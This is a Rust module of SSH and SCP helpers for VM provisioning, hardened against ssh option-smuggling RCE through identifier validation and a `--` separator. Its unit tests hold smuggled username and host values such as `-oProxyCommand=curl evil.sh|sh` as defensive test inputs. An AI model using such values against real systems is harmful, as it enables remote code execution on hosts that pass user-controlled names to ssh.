//! Shared SSH primitives used by the meda + lume provisioning paths.
//! Builds the right `ssh`/`scp` invocation for key-based or password-based auth.
//!
//! Hardening: `SshTarget::new` validates `user` and `host` against a strict
//! identifier regex so payload-controlled values (e.g. `login.username` from
//! the cirun api) cannot be smuggled past argv parsing. OpenSSH treats any
//! argv element starting with `-` as an option regardless of an embedded `@`,
//! so a username like `-oProxyCommand=…` would otherwise yield RCE on the
//! agent host. Validation + a literal `--` argv separator before the
//! destination is defence-in-depth: either alone is sufficient, both together
//! make the failure mode obvious to anyone touching this file.

use anyhow::{anyhow, Result};
use log::info;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::time::Duration;
use tokio::process::Command;

// Each variant is exclusively used by a single per-OS executor path:
// `Key` by meda (linux), `PasswordFile` by lume (macos). On either host
// the unused variant is dead — that's by design, not a bug — so the
// allow keeps `-D warnings` happy on both targets without breaking the
// pattern-match exhaustiveness of the rest of the module.
#[allow(dead_code)]
#[derive(Debug, Clone)]
pub enum SshAuth {
    /// `ssh -i <path>` — used by meda (cloud-init seeds an ed25519 key).
    Key(PathBuf),
    /// `sshpass -f <path>` — used by lume (cloned macOS VM authenticates with the template user's password).
    PasswordFile(PathBuf),
}

pub struct SshTarget {
    host: String,
    user: String,
    auth: SshAuth,
}

/// Accept identifiers a sane Unix username or hostname/IP could plausibly use.
/// Rejects anything starting with `-` (option smuggling) plus shell metachars,
/// quotes, whitespace, and the path separator. IPv4/IPv6/hostnames all fit
/// inside `[A-Za-z0-9._:-]`; usernames inside `[A-Za-z0-9._-]`. Cap length at
/// 253 (DNS label limit) to bound any worst-case argv ballooning.
fn is_safe_ssh_identifier(s: &str) -> bool {
    if s.is_empty() || s.len() > 253 {
        return false;
    }
    if s.starts_with('-') {
        return false;
    }
    s.bytes()
        .all(|b| b.is_ascii_alphanumeric() || b == b'.' || b == b'_' || b == b'-' || b == b':')
}

#[derive(Debug, thiserror::Error)]
pub enum SshError {
    #[error("invalid ssh user '{0}' — must match [A-Za-z0-9._-]{{1,253}} and not start with '-'")]
    InvalidUser(String),
    #[error("invalid ssh host '{0}' — must match [A-Za-z0-9.:_-]{{1,253}} and not start with '-'")]
    InvalidHost(String),
}

impl SshTarget {
    /// Validate then construct. Rejects host/user values that could be
    /// mistaken for ssh options (the option-smuggling RCE). All callers MUST
    /// use this — `host`/`user` are private to prevent struct-literal bypass.
    pub fn new(host: String, user: String, auth: SshAuth) -> Result<Self, SshError> {
        if !is_safe_ssh_identifier(&user) {
            return Err(SshError::InvalidUser(user));
        }
        if !is_safe_ssh_identifier(&host) {
            return Err(SshError::InvalidHost(host));
        }
        Ok(Self { host, user, auth })
    }

    fn ssh_options() -> Vec<&'static str> {
        vec![
            "-o",
            "StrictHostKeyChecking=no",
            "-o",
            "UserKnownHostsFile=/dev/null",
            "-o",
            "ConnectTimeout=10",
        ]
    }

    /// Extra ssh options for the password-auth flow. Without
    /// `PreferredAuthentications=password` + `PubkeyAuthentication=no`,
    /// ssh tries every key in `~/.ssh/` first, then falls back to
    /// keyboard-interactive — and `sshpass -f` only intercepts the
    /// `password` prompt, not keyboard-interactive. The result on macOS
    /// hosts is a silent ssh exit (just "Permanently added <ip>" stderr,
    /// no auth error), which the agent surfaces as "SSH exec failed".
    /// Forcing the auth method straight to `password` lets sshpass do its
    /// job and gives a real error if it still fails.
    fn ssh_password_options() -> Vec<&'static str> {
        vec![
            "-o",
            "PreferredAuthentications=password",
            "-o",
            "PubkeyAuthentication=no",
        ]
    }

    fn destination(&self) -> String {
        format!("{}@{}", self.user, self.host)
    }

    /// Build an `ssh user@host <remote_cmd>` Command, configured for the auth mode.
    /// The literal `--` argv separator before the destination guarantees ssh
    /// stops parsing options before our user-controlled value (defence in
    /// depth — `SshTarget::new` already validates these).
    fn ssh_cmd(&self, remote_cmd: &str) -> Command {
        match &self.auth {
            SshAuth::Key(key_path) => {
                let mut c = Command::new("ssh");
                c.arg("-i")
                    .arg(key_path)
                    .args(Self::ssh_options())
                    .arg("--")
                    .arg(self.destination())
                    .arg(remote_cmd)
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped());
                c
            }
            SshAuth::PasswordFile(pw_path) => {
                let mut c = Command::new("sshpass");
                c.arg("-f")
                    .arg(pw_path)
                    .arg("ssh")
                    .args(Self::ssh_options())
                    .args(Self::ssh_password_options())
                    .arg("--")
                    .arg(self.destination())
                    .arg(remote_cmd)
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped());
                c
            }
        }
    }

    /// Build an `scp <local> user@host:<remote>` Command. `--` separator same
    /// reason as `ssh_cmd`.
    fn scp_cmd(&self, local: &Path, remote: &str) -> Command {
        let remote_arg = format!("{}:{}", self.destination(), remote);
        match &self.auth {
            SshAuth::Key(key_path) => {
                let mut c = Command::new("scp");
                c.arg("-i")
                    .arg(key_path)
                    .args(Self::ssh_options())
                    .arg("--")
                    .arg(local)
                    .arg(remote_arg)
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped());
                c
            }
            SshAuth::PasswordFile(pw_path) => {
                let mut c = Command::new("sshpass");
                c.arg("-f")
                    .arg(pw_path)
                    .arg("scp")
                    .args(Self::ssh_options())
                    .args(Self::ssh_password_options())
                    .arg("--")
                    .arg(local)
                    .arg(remote_arg)
                    .stdout(Stdio::piped())
                    .stderr(Stdio::piped());
                c
            }
        }
    }
}

/// Run a remote command via SSH with a hard timeout. Captures stdout/stderr.
///
/// On timeout, the partial stdout/stderr buffered up to the kill point is
/// included in the error message — this is the only way to tell whether the
/// remote command silently hung mid-output vs. SSH itself was the one
/// holding the channel open after `echo` already printed its result.
pub async fn exec(target: &SshTarget, remote_cmd: &str, timeout: Duration) -> Result<String> {
    use std::sync::{Arc, Mutex};
    use tokio::io::AsyncReadExt;

    let start = std::time::Instant::now();
    let mut child = target
        .ssh_cmd(remote_cmd)
        .spawn()
        .map_err(|e| anyhow!("SSH spawn error: {}", e))?;

    let stdout = child
        .stdout
        .take()
        .ok_or_else(|| anyhow!("no stdout pipe"))?;
    let stderr = child
        .stderr
        .take()
        .ok_or_else(|| anyhow!("no stderr pipe"))?;

    let out_buf: Arc<Mutex<Vec<u8>>> = Arc::new(Mutex::new(Vec::new()));
    let err_buf: Arc<Mutex<Vec<u8>>> = Arc::new(Mutex::new(Vec::new()));

    let out_writer = Arc::clone(&out_buf);
    let err_writer = Arc::clone(&err_buf);
    let out_task = tokio::spawn(async move {
        let mut s = stdout;
        let mut local = Vec::new();
        let _ = s.read_to_end(&mut local).await;
        out_writer.lock().unwrap().extend(local);
    });
    let err_task = tokio::spawn(async move {
        let mut s = stderr;
        let mut local = Vec::new();
        let _ = s.read_to_end(&mut local).await;
        err_writer.lock().unwrap().extend(local);
    });

    let snapshot = |label: &str, buf: &Arc<Mutex<Vec<u8>>>| {
        let bytes = buf.lock().unwrap().clone();
        format!("{label}={:?}", String::from_utf8_lossy(&bytes))
    };

    match tokio::time::timeout(timeout, child.wait()).await {
        Ok(Ok(status)) => {
            // Drain readers (briefly) so we get the full stdio.
            let _ = tokio::time::timeout(Duration::from_secs(1), async {
                let _ = out_task.await;
                let _ = err_task.await;
            })
            .await;
            let out = String::from_utf8_lossy(&out_buf.lock().unwrap()).to_string();
            if !status.success() {
                let err = String::from_utf8_lossy(&err_buf.lock().unwrap()).to_string();
                return Err(anyhow!(
                    "SSH exec failed (status={}, elapsed={}ms): stderr={}",
                    status,
                    start.elapsed().as_millis(),
                    err
                ));
            }
            Ok(out)
        }
        Ok(Err(e)) => Err(anyhow!("SSH wait error: {}", e)),
        Err(_) => {
            // Hard cap reached. Kill ssh; preserve whatever it had buffered.
            let _ = child.kill().await;
            let _ = tokio::time::timeout(Duration::from_millis(500), async {
                let _ = out_task.await;
                let _ = err_task.await;
            })
            .await;
            Err(anyhow!(
                "SSH exec timed out after {:?} (elapsed={}ms); partial {}; partial {}",
                timeout,
                start.elapsed().as_millis(),
                snapshot("stdout", &out_buf),
                snapshot("stderr", &err_buf),
            ))
        }
    }
}

/// Result of a successful detached-exec: the PID the remote command
/// echoed plus the timing/stdio captured up to the kill point. The
/// `stdout` and `stderr` fields are surfaced for callers that want
/// to log the surrounding ssh chatter (e.g. known-hosts warnings)
/// but no current caller consumes them.
#[derive(Debug, Clone)]
pub struct DetachedOk {
    pub pid: u32,
    pub elapsed_ms: u128,
    #[allow(dead_code)]
    pub stdout: String,
    #[allow(dead_code)]
    pub stderr: String,
}

/// Result of a failed detached-exec: structured enough that callers
/// can stuff the fields straight into a metadata bag without further
/// parsing.
#[derive(Debug, Clone)]
pub struct DetachedErr {
    pub message: String,
    pub elapsed_ms: u128,
    pub partial_stdout: String,
    pub partial_stderr: String,
}

impl std::fmt::Display for DetachedErr {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.message)
    }
}

/// Parse a stdout line as a PID. Accepts an optional trailing newline
/// and leading/trailing whitespace; rejects anything non-numeric or
/// empty. Extracted from `exec_detached_get_pid` so the parse rules
/// are testable without spawning a child process.
fn parse_pid_line(line: &str) -> Option<u32> {
    line.trim().parse::<u32>().ok()
}

/// Run a remote command via SSH and return as soon as the remote
/// printed a PID-shaped line. Unlike `exec`, this does NOT wait for
/// the SSH channel to close — once we have the PID we kill the SSH
/// client immediately.
///
/// The detached-mode provision flow needs this because the remote
/// command's structure is `nohup background-script & echo $!`: the
/// PID prints in ~milliseconds but OpenSSH keeps the channel open for
/// tens of seconds waiting for the backgrounded fds to release. With
/// `exec`'s "wait for child exit" semantics, every provision was
/// gambling against the 60s timeout cliff; this primitive removes
/// the gamble entirely.
pub async fn exec_detached_get_pid(
    target: &SshTarget,
    remote_cmd: &str,
    timeout: Duration,
) -> std::result::Result<DetachedOk, DetachedErr> {
    use std::sync::{Arc, Mutex};
    use tokio::io::{AsyncBufReadExt, BufReader};
    use tokio::sync::oneshot;

    let start = std::time::Instant::now();

    let mut child = match target.ssh_cmd(remote_cmd).spawn() {
        Ok(c) => c,
        Err(e) => {
            return Err(DetachedErr {
                message: format!("SSH spawn error: {e}"),
                elapsed_ms: start.elapsed().as_millis(),
                partial_stdout: String::new(),
                partial_stderr: String::new(),
            });
        }
    };

    let stdout = match child.stdout.take() {
        Some(s) => s,
        None => {
            return Err(DetachedErr {
                message: "no stdout pipe".into(),
                elapsed_ms: start.elapsed().as_millis(),
                partial_stdout: String::new(),
                partial_stderr: String::new(),
            });
        }
    };
    let stderr = match child.stderr.take() {
        Some(s) => s,
        None => {
            return Err(DetachedErr {
                message: "no stderr pipe".into(),
                elapsed_ms: start.elapsed().as_millis(),
                partial_stdout: String::new(),
                partial_stderr: String::new(),
            });
        }
    };

    // Buffer stderr in the background so we can include it in any
    // error path without blocking on EOF.
    let err_buf: Arc<Mutex<Vec<u8>>> = Arc::new(Mutex::new(Vec::new()));
    let err_writer = Arc::clone(&err_buf);
    let err_task = tokio::spawn(async move {
        use tokio::io::AsyncReadExt;
        let mut s = stderr;
        let mut local = Vec::new();
        let _ = s.read_to_end(&mut local).await;
        err_writer.lock().unwrap().extend(local);
    });

    // Stream stdout line-by-line. As soon as we hit a parseable PID
    // line we resolve and break out of the loop — the read task gets
    // dropped, which closes our end of the pipe.
    let (tx, rx) = oneshot::channel::<std::result::Result<(u32, String), String>>();
    let stdout_task = tokio::spawn(async move {
        let mut reader = BufReader::new(stdout);
        let mut accumulated = String::new();
        let mut line = String::new();
        loop {
            line.clear();
            match reader.read_line(&mut line).await {
                Ok(0) => {
                    let _ = tx.send(Err(format!("EOF before PID line; got: {accumulated:?}")));
                    return;
                }
                Ok(_) => {
                    accumulated.push_str(&line);
                    if let Some(pid) = parse_pid_line(&line) {
                        let _ = tx.send(Ok((pid, accumulated.clone())));
                        return;
                    }
                    // Non-PID line (warnings like "Permanently added
                    // ..." from known-hosts). Keep reading.
                }
                Err(e) => {
                    let _ = tx.send(Err(format!("stdout read error: {e}")));
                    return;
                }
            }
        }
    });

    let outcome = tokio::time::timeout(timeout, rx).await;
    let stderr_snapshot = || String::from_utf8_lossy(&err_buf.lock().unwrap()).to_string();

    // Whether we resolved or timed out: we have the PID we need (or
    // we've given up); kill the SSH client to release the channel.
    // The remote nohup'd process is independent of this client.
    match outcome {
        Ok(Ok(Ok((pid, accumulated)))) => {
            let _ = child.start_kill();
            let _ = child.wait().await;
            stdout_task.abort();
            let _ = err_task.await;
            Ok(DetachedOk {
                pid,
                elapsed_ms: start.elapsed().as_millis(),
                stdout: accumulated,
                stderr: stderr_snapshot(),
            })
        }
        Ok(Ok(Err(msg))) => {
            let _ = child.kill().await;
            stdout_task.abort();
            let _ = err_task.await;
            Err(DetachedErr {
                message: msg,
                elapsed_ms: start.elapsed().as_millis(),
                partial_stdout: String::new(),
                partial_stderr: stderr_snapshot(),
            })
        }
        Ok(Err(_)) => {
            // Sender dropped — only happens if the stdout task itself
            // panicked, which would mean the BufReader couldn't be
            // constructed (impossible — we already pulled the pipe).
            // Surface defensively as a generic failure.
            let _ = child.kill().await;
            stdout_task.abort();
            let _ = err_task.await;
            Err(DetachedErr {
                message: "stdout reader task ended unexpectedly".into(),
                elapsed_ms: start.elapsed().as_millis(),
                partial_stdout: String::new(),
                partial_stderr: stderr_snapshot(),
            })
        }
        Err(_) => {
            let _ = child.kill().await;
            stdout_task.abort();
            let _ = err_task.await;
            Err(DetachedErr {
                message: format!("detached exec timed out after {timeout:?}"),
                elapsed_ms: start.elapsed().as_millis(),
                partial_stdout: String::new(),
                partial_stderr: stderr_snapshot(),
            })
        }
    }
}

/// Cheap connectivity probe: runs `echo` over SSH. Returns Ok if the connection works.
pub async fn test_connection(target: &SshTarget) -> Result<()> {
    exec(target, "echo SSH-OK", Duration::from_secs(30)).await?;
    Ok(())
}

/// Copy a local file to the remote via SCP.
pub async fn copy_file(target: &SshTarget, local: &Path, remote: &str) -> Result<()> {
    let output = tokio::time::timeout(
        Duration::from_secs(60),
        target.scp_cmd(local, remote).output(),
    )
    .await
    .map_err(|_| anyhow!("SCP transfer timed out after 60s"))?
    .map_err(|e| anyhow!("SCP spawn error: {}", e))?;
    if !output.status.success() {
        return Err(anyhow!(
            "SCP failed: {}",
            String::from_utf8_lossy(&output.stderr)
        ));
    }
    info!(
        "✔ SCP transferred {:?} -> {}:{}",
        local,
        target.destination(),
        remote
    );
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_pid_line_accepts_plain_digits() {
        assert_eq!(parse_pid_line("18066"), Some(18066));
    }

    #[test]
    fn parse_pid_line_trims_trailing_newline() {
        assert_eq!(parse_pid_line("18066\n"), Some(18066));
    }

    #[test]
    fn parse_pid_line_trims_surrounding_whitespace() {
        assert_eq!(parse_pid_line("  18066  \r\n"), Some(18066));
    }

    #[test]
    fn parse_pid_line_rejects_non_digits() {
        // OpenSSH chatter ("Permanently added '…' (ED25519) to the
        // list of known hosts.") would land in stdout if the agent
        // ever forgot `UserKnownHostsFile=/dev/null`; we must NOT
        // treat that line as a PID — otherwise the agent reports
        // success on a busted provision.
        for s in [
            "Permanently added '10.0.0.1' (ED25519)",
            "",
            "    ",
            "12abc",
            "abc",
            "12.3",
        ] {
            assert!(
                parse_pid_line(s).is_none(),
                "parse_pid_line wrongly accepted: {s:?}"
            );
        }
    }

    #[test]
    fn parse_pid_line_rejects_overflow() {
        // u32::MAX + 1 — must fail rather than wrap.
        assert!(parse_pid_line("4294967296").is_none());
    }

    #[test]
    fn safe_identifier_accepts_normal_usernames_and_hosts() {
        for s in [
            "runner",
            "ubuntu",
            "cirun-runner",
            "10.0.0.1",
            "host.example.com",
            "::1",
        ] {
            assert!(is_safe_ssh_identifier(s), "rejected legitimate value: {s}");
        }
    }

    #[test]
    fn safe_identifier_rejects_option_smuggling() {
        for s in ["-oProxyCommand=curl evil.sh|sh", "-i/tmp/evil", "-", "--"] {
            assert!(!is_safe_ssh_identifier(s), "leading-dash accepted: {s}");
        }
    }

    #[test]
    fn safe_identifier_rejects_shell_metachars_and_whitespace() {
        for s in ["a b", "a;b", "a|b", "a$b", "a`b`", "a\nb", "a/b", "a\"b"] {
            assert!(!is_safe_ssh_identifier(s), "metachar accepted: {s:?}");
        }
    }

    #[test]
    fn safe_identifier_rejects_empty_and_overlong() {
        assert!(!is_safe_ssh_identifier(""));
        assert!(!is_safe_ssh_identifier(&"a".repeat(254)));
    }

    #[test]
    fn ssh_target_new_rejects_option_smuggling_user() {
        let r = SshTarget::new(
            "10.0.0.1".into(),
            "-oProxyCommand=curl evil|sh".into(),
            SshAuth::Key(PathBuf::from("/tmp/k")),
        );
        assert!(matches!(r, Err(SshError::InvalidUser(_))));
    }

    #[test]
    fn ssh_target_new_rejects_option_smuggling_host() {
        let r = SshTarget::new(
            "-oProxyCommand=evil".into(),
            "runner".into(),
            SshAuth::Key(PathBuf::from("/tmp/k")),
        );
        assert!(matches!(r, Err(SshError::InvalidHost(_))));
    }

    #[test]
    fn ssh_target_new_accepts_valid() {
        let r = SshTarget::new(
            "10.0.0.1".into(),
            "runner".into(),
            SshAuth::Key(PathBuf::from("/tmp/k")),
        );
        assert!(r.is_ok());
    }
}
